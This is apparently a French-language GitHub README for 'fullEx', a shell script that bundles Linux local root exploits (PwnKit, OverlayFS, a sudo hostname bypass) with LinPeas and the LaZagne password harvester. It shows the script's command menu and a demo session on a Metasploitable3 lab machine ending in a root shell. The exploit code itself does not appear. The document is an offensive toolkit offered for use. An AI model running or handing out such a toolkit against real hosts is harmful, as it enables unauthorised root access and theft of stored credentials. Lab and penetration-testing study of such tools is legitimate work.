# <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


Les exploits root & outils dispo :

💀 Sudo Host

💀 OverlayFS

💀 PwnKit

🤖 LinPeas

👾 LaZagne

# ⚙️ Commandes

```
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Commands:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne
   -Overlays      Compilation + execution binaire - CVE-2015-1328
   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -SudoHost      Sudo Hostname - CVE-2025-32462   
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution '/fullEx'
   -help          Affiche les commandes
 ```
# 💲 Demo

```
vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
[+] Sudo Host Bypass Exploit - CVE-2025-32462
[+] Discovered by: Rich Mirch
[+] Exploit by: J3rich0123
[+] Target: Linux x86_64
[+] Starting pseudo-root shell on dev.
[+] Type 'exit' or 'quit' to leave.
[+] For a real shell, type: bash
[+] Or: vim → :!bash to break into a real TTY shell
root@dev# bash -i
root@metasploitable3-ub1404:~/fullEx# id
uid=0(root) gid=0(root) groups=0(root)
```
